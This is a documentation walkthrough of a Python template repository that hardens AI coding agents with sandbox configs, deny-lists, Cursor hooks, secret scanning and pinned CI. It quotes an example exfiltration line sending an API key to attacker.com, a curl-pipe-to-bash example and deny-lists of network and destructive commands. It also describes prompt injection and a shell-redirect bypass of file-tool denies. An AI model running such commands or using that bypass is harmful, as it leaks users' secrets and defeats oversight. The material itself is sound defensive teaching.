# Walkthrough: how this template achieves secure agentic workflows

> **Audience.** Developers who are comfortable with Python but new to "AI
> coding agents" (Cursor, OpenAI Codex CLI, Claude Code, etc.) and the
> security questions they raise. If you already know the AGENTS.md
> standard, SHA-pinned actions, and Codex sandbox modes, you can skip this
> file — it is a *learning resource*, not load-bearing config.
>
> **Safe to delete.** Nothing else in the repo depends on this file. If you
> want a leaner template, remove `docs/walkthrough.md` (and the matching
> mention in [README.md](../README.md)) and you lose no functionality.

This document is a guided tour of the template in layers, starting from
the foundation and building up. For each piece you get (a) **what it is in
general terms**, (b) **what the file does in this specific repo**, and
(c) **why it matters for security and/or agent quality**.

At the end there is a "threat model" section mapping each layer to the
specific risks it mitigates, so you can see why the whole thing is
designed the way it is.

---

## Layer 1 — Reproducible Python environment

Coding agents are notorious for "works on my machine" failures. If two
runs of the same prompt produce different Python versions or different
package versions, the agent will produce inconsistent diffs and tests
will flap. The first job of the template is to eliminate that drift.

### `uv` — the package manager

**Concept.** `uv` is an extremely fast Python package manager written in
Rust by Astral (the people who make Ruff). It replaces the traditional
combo of `pip` + `venv` + `pip-tools` + `poetry` with one binary. It does
three things that matter here:

1. **Creates an isolated `.venv/`** so your project's libraries do not
   collide with system Python or other projects.
2. **Resolves and locks dependencies** into `uv.lock` — a file that pins
   the *exact* version of every direct and transitive dependency. Anyone
   who runs `uv sync --frozen` later gets bit-for-bit the same
   environment.
3. **Runs commands inside that env** via `uv run <cmd>` so you never have
   to remember to "activate" anything.

**In this repo.** [`pyproject.toml`](../pyproject.toml) declares the
direct dependencies (`pydantic-ai`, `python-dotenv`) and dev dependencies
(`pytest`, `ruff`, `mypy`, `pre-commit`). `uv.lock` (committed) records
the exact resolution. `.python-version` pins the Python version to
`3.12`.

**Why it matters for security.** Deterministic environments are a
*prerequisite* for supply-chain security. With `pip install`, the version
you get today may not be the version you get tomorrow (a malicious actor
could ship a poisoned `1.2.4` of a dependency). With `uv.lock`, every
install resolves to exactly the versions that have been reviewed and
CI-tested. Dependabot (covered later) is what keeps that lock fresh in a
controlled way.

### `pyproject.toml` — the single source of truth

**Concept.** `pyproject.toml` is the standardised file (PEP 517/518/621)
where Python projects declare their identity, dependencies, build system,
and **tool configuration**. By keeping all tool configs here instead of
in `setup.cfg`, `mypy.ini`, `pytest.ini`, `.ruff.toml`, etc., the agent
has *one* file to read and update.

**In this repo.** [`pyproject.toml`](../pyproject.toml) contains:

- `[project]` — metadata, `requires-python = ">=3.12"`, dependencies.
- `[project.scripts]` — registers the `llm-uv-template` command so you
  can run `uv run llm-uv-template "…"`.
- `[build-system]` — uses `hatchling` to build wheels.
- `[dependency-groups] dev` — the modern (PEP 735) way to declare
  dev-only tools, isolated from runtime deps so they do not ship to
  production.
- `[tool.ruff]`, `[tool.mypy]`, `[tool.pytest.ini_options]` — every
  quality tool's config in one file.

**Why it matters for agents.** An LLM agent reading the repo to
understand "what tooling is in use" only has to read this one file. That
is both faster (fewer tokens) and more reliable (no chance of
contradictory config in two places).

### `.env.example` and `.env` — the secrets boundary

**Concept.** The 12-Factor App pattern: *secrets and environment-specific
configuration live in environment variables, never in source*. `.env`
holds the real values on a developer's machine; `.env.example` is a
committed schema showing *which* variables exist without revealing
values.

**In this repo.** [`.env.example`](../.env.example) lists
`PYDANTIC_AI_MODEL`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`,
`GEMINI_API_KEY` with placeholder values. The real `.env` is gitignored.
`src/llm_uv_template/__main__.py` calls `dotenv.load_dotenv()` to read it
at runtime.

**Why it matters for security.** This separation is what makes everything
else possible. Once secrets only live in `.env`, you can write blanket
rules like "no agent ever reads `.env`" (which the rules + sandboxes
enforce) without that being a usability problem — because the agent can
read `.env.example` to *learn the schema* anytime it wants.

### `.gitignore` — the boundary for git

**Concept.** Lists path patterns git refuses to track. It is the single
most important file for preventing accidental secret commits.

**In this repo.** [`.gitignore`](../.gitignore) blocks `.env` / `.env.*`
(but explicitly *un*-ignores `.env.example` so the schema stays in git),
the `.venv/`, every Python cache (`__pycache__`, `.mypy_cache`,
`.ruff_cache`, `.pytest_cache`), build output, and IDE state. Notably,
`uv.lock` is **not** ignored — it is committed on purpose, because
reproducibility requires it.

---

## Layer 2 — Telling agents the rules: `AGENTS.md` and friends

This is the conceptual core of the template. Older AI-coding setups
required a separate config file for every tool (`.cursorrules`,
`CLAUDE.md`, `.windsurfrules`, `.aider.conf.yml`, …). That does not
scale.

### The `AGENTS.md` standard

**Concept.** `AGENTS.md` is a markdown file at the repo root with
project-specific instructions for coding agents. As of late 2025 it is
stewarded by the Linux Foundation's Agentic AI Foundation, with backing
from OpenAI, Anthropic, Google, and AWS. It is natively read by
**OpenAI Codex CLI**, **GitHub Copilot**, **Cursor**, **Windsurf**,
**Devin**, and others. Think of it as `CONTRIBUTING.md`, but for
machines.

The format is informal — just markdown — but the convention is: sections
for environment setup, how to build/test, code style, and any
project-specific gotchas. **Copy-pasteable commands beat prose**, because
the agent will literally copy them.

**In this repo.** [`AGENTS.md`](../AGENTS.md) has eight numbered sections
covering project purpose, environment (`uv`-only, never `pip`),
copy-pasteable command table, code style (typed everything, functions
over classes), tests (always mock the LLM with `TestModel`),
**explicit security boundaries** (never read `.env`, never log keys,
validate untrusted input before passing it to `subprocess` / `eval` /
SQL / filesystem), dependency policy, and commit conventions.

**Why it matters.** This single file gives all the major agents the same
context, so you do not get a "Cursor builds it one way, Codex builds it
another" inconsistency. It also reduces the "boilerplate vs project
code" tension: instead of scaffolding ten base classes the agent must
navigate, you write *one paragraph* telling the agent how to scaffold
those classes on demand. That is the "rules over code" idea.

### `CLAUDE.md` — the Claude Code shim

**Concept.** Claude Code is the one major exception that does not
natively read `AGENTS.md` yet. It looks for `CLAUDE.md`. Rather than
maintain two copies, the template uses Claude Code's `@file` import
syntax.

**In this repo.** [`CLAUDE.md`](../CLAUDE.md) is six lines: `@AGENTS.md`
(pulls in the canonical rules) plus a short section for Claude-specific
notes (prefer `Read` / `Edit` / `Write` tools over `Bash cat/sed`,
respect the `.claude/settings.json` allow-list).

### `.cursor/rules/*.mdc` — Cursor's structured rules

**Concept.** Cursor used to read a single `.cursorrules` file, but as of
2025 that is deprecated. The current format is a directory
`.cursor/rules/` containing multiple `.mdc` files (Markdown with YAML
frontmatter), each with one of four activation modes:

- **`alwaysApply: true`** — always loaded.
- **`globs: ["pattern"]`** — auto-attached when a matching file is in
  context.
- **`description`** — agent decides whether to load based on the
  description.
- **Manual** — only when `@`-mentioned.

This lets you scope rules tightly so the agent does not waste tokens on
irrelevant ones.

**In this repo.** Four files split by concern:

- [`.cursor/rules/00-always.mdc`](../.cursor/rules/00-always.mdc)
  (`alwaysApply: true`) — short baseline: "Read AGENTS.md, use `uv`, run
  checks before stopping."
- [`.cursor/rules/10-python.mdc`](../.cursor/rules/10-python.mdc)
  (`globs: ["**/*.py"]`) — Python style, only loaded when editing
  Python.
- [`.cursor/rules/20-tests.mdc`](../.cursor/rules/20-tests.mdc)
  (`globs: ["tests/**/*.py"]`) — testing conventions, only loaded when
  editing tests.
- [`.cursor/rules/30-security.mdc`](../.cursor/rules/30-security.mdc)
  (`alwaysApply: true`) — non-negotiable security rules: no secrets in
  code, validate untrusted input before `subprocess` / `eval` /
  filesystem / SQL, no `curl | sh`.

**Why it matters.** The `globs` mechanism means a Cursor agent editing
`src/foo.py` does not burn context on the test-writing rules, and vice
versa. The security rule is `alwaysApply: true` precisely because that
is the one you can never afford to have unloaded.

---

## Layer 3 — Filtering what the agent can see (`*ignore` files)

Even with good rules, the agent's *context window* is finite and
dangerous to over-fill. Two problems:

1. **Token waste.** A 5 MB CSV in your repo will burn through the
   model's context if it gets indexed and retrieved.
2. **Exfiltration risk.** If your agent reads `.env` to "understand the
   project", and then a user pastes that conversation somewhere, you have
   leaked the keys. If the agent is told to "summarize the project" via
   an external tool, the secrets go with it.

The fix: tell every agent which files to ignore at the *indexing* layer,
not just at runtime.

### `.cursorignore`, `.codexignore`, `.aiderignore`

**Concept.** Each modern coding agent has its own equivalent of
`.gitignore` for the agent's context window. The syntax is the same as
`.gitignore`, but the effect is different — files matched here are
*invisible to the agent*, even though they exist on disk.

**In this repo.** All three files have identical content and block:

- **Secrets**: `.env`, `.env.*` (but allow `.env.example`), `*.pem`,
  `*.key`, `*.crt`, `credentials.json`, `.aws/`, `.ssh/`, `.gnupg/`.
- **Lockfiles**: `uv.lock`, `package-lock.json`, etc. — they are huge
  and the agent should never need to *read* them (it generates them via
  `uv lock`).
- **Caches and build output**: `.venv/`, `__pycache__/`, `dist/`,
  `*.egg-info/`, `node_modules/`.
- **Large/binary data**: `*.csv`, `*.parquet`, `*.png`, `*.pdf`,
  archives, etc.
- **VCS internals**: `.git/`.

**Why it matters.** A prompt-injection attack on an agent — where an LLM
is tricked by content in a file into doing something malicious — fails
closed if the agent literally cannot see `.env`. Token economy is the
secondary benefit.

> **Caveat: shell redirects bypass file-tool denies.** The
> `.claude/settings.json` deny-list prevents Claude from using its
> *file* tools (`Read`, `Write`, `Edit`) on `.env`, but a shell command
> like `echo "OPENAI_API_KEY=…" > .env` is routed through `Bash`, which
> is in the allow-list for common utilities (`echo`, `cat`, `tee`, …).
> The same gap exists in Cursor and Codex. Layer 5 below
> (`.cursor/hooks/`) is what closes it project-wide; the downstream
> mitigations (`.gitignore`, gitleaks, fixture-scrubbed test keys) are
> still in place as defence-in-depth.

---

## Layer 4 — Sandboxing the agent's *actions*

Reading is one risk; *executing* is another. Modern coding agents can
run shell commands. The template caps what those commands can do.

### `.codex/config.toml` — Codex CLI sandbox

**Concept.** Codex CLI (OpenAI's official terminal-based coding agent)
reads a project-level TOML config that sets two security-critical knobs:

- **`approval_policy`** — does Codex pause to ask before running each
  shell command?
  - `untrusted` (always ask), `on-request` (ask for risky commands),
    `never` (run anything).
- **`sandbox_mode`** — what is the OS-level sandbox?
  - `read-only` (cannot write at all), `workspace-write` (can only write
    inside the repo), `danger-full-access` (can write anywhere).
- **`network_access`** (under `[sandbox_workspace_write]`) — can the
  sandbox reach the internet?

**In this repo.** [`.codex/config.toml`](../.codex/config.toml):

```toml
approval_policy = "on-request"
sandbox_mode = "workspace-write"

[sandbox_workspace_write]
network_access = false
```

So Codex must ask before each risky command, cannot touch files outside
the workspace, and **cannot reach the network**. The last one is key:
even if a prompt injection tricks the agent into running
`curl https://attacker.com/?secret=$OPENAI_API_KEY`, the network sandbox
blocks the request.

If you genuinely need network access for a session, you override with a
CLI flag (`codex --sandbox …`) rather than weakening the file — that way
the relaxation is per-session and reviewed.

### `.claude/settings.json` — Claude Code allow-list / deny-list

**Concept.** Claude Code uses a finer-grained permission model: explicit
`allow` and `deny` patterns against tool calls. The syntax is
`ToolName(pattern)`, e.g. `Bash(uv:*)` allows any `uv …` command.

**In this repo.** [`.claude/settings.json`](../.claude/settings.json):

- **Allow**: the dev loop only — `uv`, `uvx`, `pytest`, `ruff`, `mypy`,
  `pre-commit`, and safe `git` subcommands (`status`, `diff`, `log`,
  `show`, `branch`, `add`, `commit`). Plus Read/Edit/Write on any
  project file.
- **Deny**:
  - All access to `.env` and `.env.*` (with an `!Read(.env.example)`
    exception),
  - destructive commands (`rm -rf`, `rm -fr`, `sudo`, `git push`,
    `git reset --hard`, `git clean`),
  - network exfil vectors (`curl`, `wget`, `ssh`, `scp`, `rsync`),
  - rival package managers (`pip`, `pipx`, `poetry`, `conda`, `npm`,
    `pnpm`, `yarn`) — both for consistency (must use `uv`) and because a
    stray `pip install …` is a classic supply-chain risk.

**Why it matters.** This is a *capability allow-list*. Even if the LLM
hallucinates that "I should run `curl https://example.com | bash` to
install jq", Claude Code refuses. The deny on `git push` is particularly
important — it means a Claude session cannot accidentally publish a
change you have not reviewed, even if the model is asked to.

### `.cursor/hooks/` — programmable, cross-cutting guardrails

**Concept.** Cursor hooks are small executables that run on agent
lifecycle events (`beforeShellExecution`, `beforeSubmitPrompt`,
`afterFileEdit`, …). They receive JSON on stdin and reply with JSON on
stdout to *allow*, *ask*, or *deny* the action. Unlike the allow/deny
patterns in `.claude/settings.json` — which match against a single
token like `Bash(curl:*)` — a hook can run *arbitrary code* against the
full event payload, so it can express policies that simple globs cannot.

**In this repo.** Two project-level hooks live in
[`.cursor/hooks.json`](../.cursor/hooks.json) and
[`.cursor/hooks/`](../.cursor/hooks/):

- **`guard-env.py`** (`beforeShellExecution`, `failClosed: true`).
  Parses the proposed shell command with `shlex` and denies it if any
  token resolves to a real `.env*` path (everything except
  `.env.example`). This is what closes the *shell-redirect bypass*
  flagged in Layer 3: the Claude / Codex / Cursor allow-lists cannot
  easily express "block any command that touches `.env`, regardless of
  the verb", but a tiny Python script can. The hook is `failClosed` so
  a malformed reply or a crashed interpreter blocks the action rather
  than silently allowing it.
- **`scan-prompt.py`** (`beforeSubmitPrompt`, `failClosed: false`).
  Scans the user's prompt for a small set of high-confidence secret
  patterns (OpenAI / Anthropic / GitHub / AWS / Slack tokens, JWTs, PEM
  headers) before it is sent to the model. On a hit it returns
  `permission: "ask"` with a human-readable warning. False positives
  here would be infuriating, so the hook *asks* rather than *blocks* —
  the goal is a human-in-the-loop checkpoint, not a tripwire.

Both scripts are stdlib-only Python 3 (no `uv sync` dependency, no
`jq`, no `node`) so they run on a fresh clone before any setup.

**Why it matters.** Hooks are the only place in this template where
guardrails are *executable code reviewing executable code*. That makes
them strictly more expressive than the static allow-lists in
`.claude/settings.json` or `.codex/config.toml`, at the cost of being
Cursor-specific. If you adopt other agents that grow comparable hook
systems (Codex's `tools.allow_command` callbacks, future Claude hook
support), porting these two scripts is a 5-line change each — they are
deliberately self-contained.

---

## Layer 5 — The Python skeleton itself

Now we get to the actual code. It is deliberately small.

### `src/llm_uv_template/`

The `src/` layout is a Python convention: putting your package under
`src/` instead of at the repo root prevents accidental "imports from the
wrong place" during development. The agent cannot import the package
without it being installed properly.

- [`src/llm_uv_template/__init__.py`](../src/llm_uv_template/__init__.py)
  — exports the public API (`CityInfo`, `build_agent`).
- [`src/llm_uv_template/agent.py`](../src/llm_uv_template/agent.py) —
  the example `pydantic-ai` agent.
- [`src/llm_uv_template/__main__.py`](../src/llm_uv_template/__main__.py)
  — CLI wrapper that loads `.env` and prints structured JSON.
- `src/llm_uv_template/py.typed` — an empty marker file (PEP 561) that
  tells type checkers "this package's types can be trusted by downstream
  users".

### `pydantic-ai` — the agent framework

**Concept.** `pydantic-ai` is a Python framework for building LLM
agents, from the team behind Pydantic. Two ideas make it well-suited for
an agent-first template:

1. **Typed I/O.** You declare a Pydantic `BaseModel` (`CityInfo`) and
   the agent guarantees its output conforms to it. If the LLM
   hallucinates a malformed response, the framework retries
   automatically. This pairs perfectly with `mypy --strict`.
2. **Model-agnostic.** You write `Agent("openai:gpt-5.2")` or
   `Agent("anthropic:claude-4.6-sonnet")` and pydantic-ai handles the
   provider differences. Set `PYDANTIC_AI_MODEL` env var and one line of
   code works against any of OpenAI, Anthropic, Gemini, Mistral, Cohere,
   Groq, Ollama, etc.

**In this repo.** `agent.py` is ~50 lines. It defines `CityInfo` (the
structured output), `build_agent(model=…)` (which constructs the agent
and reads the model from env), and registers one `tool_plain`
(`current_utc_time`) so the example demonstrates tool use.

### The test pattern

**The risk.** Naive agent tests call the real LLM. That is slow,
non-deterministic, expensive, and creates a key-leak vector through CI
logs.

**The solution.** `pydantic-ai` ships
`pydantic_ai.models.test.TestModel`, a fake model that produces
synthetic but well-typed responses for any agent. You inject it with
`agent.override(model=TestModel())`.

**In this repo.**

- [`tests/conftest.py`](../tests/conftest.py) has an **autouse** fixture
  that, before every single test, overwrites *every* provider env var
  pydantic-ai (and its underlying SDKs) might read — OpenAI / Azure /
  Anthropic / Gemini / Mistral / Cohere / Groq / DeepSeek / Together /
  Fireworks / Perplexity / OpenRouter / AWS Bedrock — with
  `"test-key-not-real"`. So even if someone forgets to use `TestModel`,
  the test cannot reach a real provider with a real key, regardless of
  which model string ends up in `PYDANTIC_AI_MODEL`.
- [`tests/test_agent.py`](../tests/test_agent.py) demonstrates the
  canonical pattern:
  `with agent.override(model=TestModel()): result = await agent.run(...)`.

**Why it matters.** Two layers of defense — the test mocks the model,
and the fixture removes the keys. Either alone would prevent leakage;
together it is belt-and-suspenders.

---

## Layer 6 — Quality gates that run *before* the agent commits

The agent will introduce bugs. The job here is to catch them
automatically. There are four tools in play.

### Ruff — linter + formatter

**Concept.** Ruff (also by Astral, like `uv`) is a Rust-based
replacement for `flake8` + `black` + `isort` + ~20 other Python tools,
~100× faster than the originals. It does two jobs:

- **Lint** (`ruff check`) — catches bugs and style issues using rule
  families like `E` (pycodestyle), `F` (pyflakes), `B` (bugbear:
  anti-patterns like mutable defaults), `S` (bandit: security issues
  like `assert` in production, `subprocess` with `shell=True`,
  hardcoded passwords), `ANN` (require type annotations), `PTH` (use
  `pathlib` over `os.path`).
- **Format** (`ruff format`) — automatic code formatting like `black`.

**In this repo.** Configured in `pyproject.toml`, line length 100,
includes `S` (security lints) globally and disables some opinionated
ones (`ANN401` for `Any`, `PLR0913` for many-arg functions) that are
common in agent code.

**Why it matters for agents.** Bandit (`S`) rules are *security lints* —
they catch the classic AI-induced security bugs: a hallucinated
`subprocess.run(cmd, shell=True)`, a hardcoded API key, a
`pickle.loads()` on untrusted data. These fail CI before they reach
`main`.

### Mypy — static type checker

**Concept.** Python is dynamically typed by default, but type
annotations (`def foo(x: int) -> str:`) can be statically verified by
`mypy`. Strict mode catches a huge class of bugs: missing returns,
`None` not handled, wrong number of arguments, type mismatches at
boundaries.

**Why it matters for agents.** LLMs hallucinate function signatures all
the time — they invent a `requests.get(url, retries=5)` parameter that
does not exist, or pass a `dict` where a Pydantic model is expected.
`mypy --strict` catches every one of those in CI before the code runs.
Strict typing is especially valuable in AI projects: *types are crucial
because LLMs often hallucinate schemas; strict typing catches these
errors early.*

**In this repo.** `[tool.mypy] strict = true` in `pyproject.toml`. Tests
get a relaxed override (`disallow_untyped_defs = false`) so test
boilerplate stays terse.

### Pytest — test runner

**Concept.** The standard Python testing framework. Two notable settings
here:

- `asyncio_mode = "auto"` — `pydantic-ai` agents are async; this tells
  `pytest-asyncio` to handle the event loop automatically.
- `filterwarnings = ["error"]` — converts every Python
  `DeprecationWarning` into a test failure. This forces the codebase to
  stay current as Python/libraries evolve, which is exactly what an
  agent should be paying attention to.

### Pre-commit — runs hooks on every `git commit`

**Concept.** `pre-commit` is a tool that installs git hooks. Each time
you run `git commit`, it runs a configured list of checks against the
*staged* changes. If a hook fails, the commit is aborted. The template
does *not auto-install* it — the file is present but you must opt in via
`uv run pre-commit install`.

**In this repo.** [`.pre-commit-config.yaml`](../.pre-commit-config.yaml)
configures:

- `end-of-file-fixer`, `trailing-whitespace` — cosmetic hygiene.
- `check-added-large-files` (max 512 KB) — stops a 50 MB CSV from being
  committed by accident.
- `check-merge-conflict`, `check-toml`, `check-yaml`, `check-json` —
  syntax sanity.
- `detect-private-key` — looks for PEM private key headers.
- `ruff-check` (with `--fix`) and `ruff-format` — the lint/format checks
  run *before* CI sees them.
- **`gitleaks`** — see below.

### Gitleaks — secret scanner

**Concept.** Gitleaks scans the repo (and its git history) against a
library of patterns matching real secrets: AWS keys (`AKIA…`), GitHub
tokens (`ghp_…`), Stripe keys (`sk_live_…`), private keys, JWT tokens,
and ~200 other formats. It is the *last* line of defense — if everything
else fails and a developer pastes their `OPENAI_API_KEY` into a `# TODO`
comment, gitleaks blocks the commit.

**In this repo.** [`.gitleaks.toml`](../.gitleaks.toml) extends the
default ruleset and adds an `[allowlist]` so the obvious placeholder
values in `.env.example`, `AGENTS.md`, `README.md`, and the rule files
(`sk-replace-me`, `test-key-not-real`, etc.) do not flag as false
positives.

**Why this layer matters overall.** Every check here runs *before* code
leaves your machine *and* again in CI. Defense in depth: if a developer
skips pre-commit, CI catches it; if CI is misconfigured, pre-commit
catches it.

---

## Layer 7 — Continuous Integration (`.github/workflows/ci.yml`)

This is where automation enforces the rules on every push/PR —
including PRs *opened by agents*.

### What is a GitHub Action?

**Concept.** GitHub Actions is GitHub's built-in CI/CD system. A
"workflow" is a YAML file in `.github/workflows/` that describes:

- **When** to run (`on: pull_request`, `on: push`, schedule, etc.).
- **Where** to run (`runs-on: ubuntu-latest` — a fresh Linux VM for each
  job).
- **Steps**: shell commands or reusable "actions" (third-party building
  blocks like `actions/checkout`).

Each PR shows green/red status checks based on whether all jobs pass.

### What "secure CI" means

There are four classic CI vulnerabilities, and this workflow defends
against each:

1. **Excessive token permissions.** By default, GitHub gives
   `GITHUB_TOKEN` write access to issues, PRs, packages, and the repo.
   A compromised step could push code, comment on PRs, or publish
   packages. **Mitigation here**:
   [`ci.yml`](../.github/workflows/ci.yml) sets
   `permissions: contents: read` at the workflow level *and* repeats
   it at the job level. The repeat is intentional: if a future
   contributor copies an existing job to start a new one, they inherit
   the safe baseline even if they forget to set it.

2. **Unpinned third-party actions.** If you write
   `uses: actions/checkout@v6`, the `v6` tag can be silently re-pointed
   to a malicious commit by an attacker who compromises the action's
   maintainer (this has happened, e.g. the `tj-actions/changed-files`
   incident in 2025). **Mitigation here**: every `uses:` line is pinned
   to a **full commit SHA**, with the tag in a comment:

   ```yaml
   # actions/checkout@v6.0.2
   - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
   ```

   A SHA is immutable; even if the maintainer's account is hacked, the
   workflow keeps running the exact code that was reviewed when it was
   pinned.

3. **Drift in pinned versions.** SHA-pinning solves security but creates
   a maintenance problem: now your actions never auto-update, so you
   lose security patches. **Mitigation**: Dependabot (next section).

4. **Stale environments hiding bugs.** **Mitigation**: matrix on
   `python-version: ["3.12", "3.13"]` runs the whole pipeline on both
   versions. `.python-version` pins `3.12` as the **dev baseline** —
   the version your laptop and the devcontainer use — while CI verifies
   forward-compatibility with `3.13`. `uv sync --frozen` enforces that
   the committed `uv.lock` matches `pyproject.toml`; `uv lock --check`
   runs first so a stale lockfile fails the build with a clear message
   rather than silently resolving to different versions.

5. **Runner network surprises.** Even a "read-only" workflow can be
   tricked into talking to an attacker-controlled host if a malicious
   dependency executes during `uv sync` (typosquatting, post-install
   script). **Mitigation here**: `step-security/harden-runner` runs as
   the very first step of every job with `egress-policy: audit`,
   logging every outbound connection. Once you have observed real
   traffic for a week, flip it to `block` with an explicit
   `allowed-endpoints` list — that turns the audit log into an active
   firewall.

> **Intentional non-use of `pull_request_target`.** The workflow uses
> `on: pull_request`, not `on: pull_request_target`. The latter runs the
> *base branch's* workflow with `GITHUB_TOKEN` write permissions and the
> PR's code checked out — a notorious footgun that has produced multiple
> real-world compromises. If you ever need PR-only write capability
> (e.g. to post a comment), prefer a separate workflow that uses
> `workflow_run` with read-only access to the artifacts, never
> `pull_request_target` with a fork's untrusted code on disk.

### The CI pipeline itself

Once the security harness is in place, the job pipeline is:

1. `step-security/harden-runner` — audit (or block) egress.
2. `uv lock --check` — fail fast if `uv.lock` and `pyproject.toml` have
   drifted, before any code runs.
3. `uv sync --frozen --all-groups` — install the exact locked
   dependencies plus dev tools.
4. `uv run ruff check .` — lint.
5. `uv run ruff format --check .` — format check (will not auto-fix in
   CI; that would defeat the purpose).
6. `uv run mypy src tests` — strict type check.
7. `uv run pytest -q` — run all tests.
8. `uv run pre-commit run gitleaks --all-files` — secret scan. Re-uses
   the exact same hook configuration as the local pre-commit, so a
   developer who skipped `pre-commit install` cannot ship a secret.
9. `uvx --from pip-audit pip-audit --disable-pip -r <locked>` — audits
   the locked runtime dependencies against the OSV / PyPI advisory
   database. Catches CVEs in dependencies that Dependabot has not yet
   PR'd.

A separate `actionlint` job runs against the workflow YAML itself (via
the upstream-published OCI image, pinned by digest), so syntax errors
and known-bad patterns in `.github/workflows/*.yml` fail fast.

A *third* workflow — [`scorecard.yml`](../.github/workflows/scorecard.yml)
— runs the **OpenSSF Scorecard** checks on push to `main` and weekly on
a schedule. Scorecard scores ~18 security best-practice signals (pinned
deps, branch protection, code-review coverage, signed releases, …) and
uploads the result to GitHub's *Security → Code Scanning* tab as SARIF.

Two deliberate design points:

1. **Non-blocking by default.** Scorecard does *not* run on
   `pull_request`, so a low score never refuses a merge. Findings still
   appear as PR annotations via Code Scanning, which means an agent
   that drops a SHA pin in a new workflow file will see Scorecard's
   complaint in the PR — and so will the reviewer.
2. **`publish_results: true`** posts the score to
   https://scorecard.dev/ so the badge in `README.md` and any external
   consumer can read it without a logged-in GitHub session.

A GitHub *template* repository copies files but not *settings*. Several
Scorecard checks (Branch-Protection, Code-Review, Token-Permissions)
read repository settings that no committed file can express. The
"Post-setup security" section of `README.md` walks the user through the
one-time UI configuration needed to push the score close to 10/10.

Plus `concurrency: cancel-in-progress: true` so a new push automatically
cancels the previous CI run on the same branch — saves CI minutes and
ensures you only ever see the latest result.

### Dependabot — `.github/dependabot.yml`

**Concept.** Dependabot is a GitHub-native bot that watches your
dependencies and opens PRs when updates are available. It scans
`pyproject.toml`, `uv.lock`, `package.json`, your GitHub Actions YAML,
Docker base images — basically any dependency manifest it knows.

**In this repo.** [`.github/dependabot.yml`](../.github/dependabot.yml)
configures two ecosystems:

- **`github-actions`** weekly: this is what *keeps the SHA pins fresh*.
  When `actions/checkout` releases `v6.0.3`, Dependabot opens a PR that
  updates the SHA in `ci.yml` (and the tag comment). You review it, CI
  runs against the new SHA, you merge. Without this, SHA-pinning rots —
  your repo would be stuck on a year-old version of every action.
- **`uv`** weekly: Dependabot understands `uv.lock` and opens PRs for
  Python dependency updates, grouped by
  `update-types: ["minor", "patch"]` so 50 individual patch updates
  become one PR per week.

**Why it matters.** This solves the perennial tension between "security
says pin everything" and "operations says nothing should rot".
Dependabot makes pinning *and* freshness compatible.

---

## Layer 8 — Reproducible execution environment (`.devcontainer/`)

### What is a devcontainer?

**Concept.** A devcontainer is a Docker container that *is your
development environment*. VS Code, Cursor, and GitHub Codespaces all
read a `.devcontainer/devcontainer.json` to know how to build it. When
you open the repo, instead of installing Python / uv / git on your
laptop, the editor spins up a fresh Linux container with all of it
preinstalled.

Two benefits:

1. **Onboarding takes 30 seconds.** Clone → open in container →
   everything works.
2. **Sandboxing.** The agent is running inside Docker. Even if it goes
   off the rails and tries to `rm -rf /`, it can only damage the
   container — your host machine is untouched.

**In this repo.**

- [`.devcontainer/Dockerfile`](../.devcontainer/Dockerfile) is a
  two-stage build. The first stage is `ghcr.io/astral-sh/uv:<tag>@sha256:…`
  (Astral's official, immutable uv image, pinned by both tag *and*
  digest); the runtime stage is
  `mcr.microsoft.com/devcontainers/python:1-3.12-bookworm@sha256:…`
  (Microsoft-maintained Debian + Python 3.12 + non-root `vscode` user).
  A single `COPY --from=uv /uv /uvx /usr/local/bin/` brings uv into the
  runtime image — no `curl | sh`, no downloaded script, no checksum
  step to forget. The Dockerfile also sets `UV_LINK_MODE=copy`,
  `PYTHONDONTWRITEBYTECODE=1`, etc. for container ergonomics.
- The `docker` Dependabot ecosystem watches `/.devcontainer/` (see
  `.github/dependabot.yml`), so when the upstream tag's digest moves
  you get a PR that bumps both the tag comment and the digest in
  lockstep. This is what makes "pin everything by digest" sustainable.
- [`.devcontainer/devcontainer.json`](../.devcontainer/devcontainer.json)
  tells the editor: use that Dockerfile, run as `vscode` (not root), run
  `uv sync --all-groups` on first creation, and install the Python /
  Ruff / Mypy VS Code extensions automatically.

**Why it matters for agents.** A reckless agent action (delete files,
install random binaries, eat the disk) is contained. For "spec-driven"
agent workflows where the agent *executes* its own generated code, this
is non-negotiable — you do not want an LLM-written script running as
root on your laptop.

---

## Layer 9 — Human-facing documentation (`README.md`)

[`README.md`](../README.md) is the only file that targets a *human*
reader. It is structured to be skimmable:

1. **Quickstart** — four shell commands to get from `git clone` to
   running agent.
2. **Day-to-day commands** — same command table as `AGENTS.md`
   (intentional duplication so humans and agents see identical
   instructions).
3. **Using with coding agents** — a table mapping each tool (Codex /
   Copilot / Cursor / Windsurf / Claude Code / Aider) to which files it
   reads. This is what makes the template *learnable*.
4. **Security model** — what is enforced, **and how to relax it**. The
   "how to relax" part is critical: undocumented defaults that frustrate
   users get disabled angrily and stay disabled.
5. **Customizing** — exact steps to rename the package, swap frameworks,
   adjust strictness.
6. **Explicitly out of scope** — explains what was *deliberately*
   excluded (no generic LLM-PR-review action, no editor-save / format
   hooks, no spec-driven YAML layer, no legacy `.cursorrules`) so
   future contributors do not "helpfully" add them. Note: the template
   *does* ship `.cursor/hooks/` (Layer 4), which intercept agent
   actions, not editor events — those are in scope.

---

## How all of this adds up: the threat model

Here is the punchline. Each layer above mitigates specific concrete
risks. The table maps them:

| Risk                                                                | Mitigated by                                                                                                                                                       |
| ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Secret leakage through git                                          | `.gitignore` (`.env` blocked) + gitleaks pre-commit + **gitleaks job in CI** + gitleaks rules                                                                      |
| Secret leakage through agent context window                         | `.cursorignore` / `.codexignore` / `.aiderignore` (agent cannot see `.env*`)                                                                                       |
| Secret leakage through agent shell exfiltration (`curl …`)          | Codex `network_access = false` + Claude deny-list (`curl`, `wget`, `ssh`, `scp`) + harden-runner egress audit in CI                                                |
| Secret leakage through shell redirect to `.env` (`echo … > .env`)   | **`.cursor/hooks/guard-env.py`** denies any shell command whose tokens resolve to a real `.env*` path                                                              |
| Secret leakage through tests calling real APIs                      | `tests/conftest.py` autouse fixture overwrites keys with fakes + `TestModel` in tests                                                                              |
| Secret pasted into the chat prompt by mistake                       | **`.cursor/hooks/scan-prompt.py`** asks for confirmation when the prompt matches a high-confidence secret pattern                                                  |
| Hallucinated API misuse (wrong types, wrong signatures)             | `mypy --strict` + Pydantic models at every boundary                                                                                                                |
